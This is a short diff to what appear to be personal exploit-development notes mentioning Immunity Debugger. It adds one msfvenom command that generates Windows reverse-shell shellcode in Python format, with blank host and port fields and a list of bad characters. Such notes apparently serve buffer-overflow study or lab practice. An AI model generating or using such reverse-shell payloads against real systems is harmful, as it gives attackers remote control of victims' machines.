@@ -60,6 +60,7 @@ IMMUNITY DEBUGGER - run as admin
 
 
 
+msfvenom -p windows/shell/reverse_tcp lhost= <> lport= <> "\x00\xfe\x20\x0a\xff" -f python
 
 
 
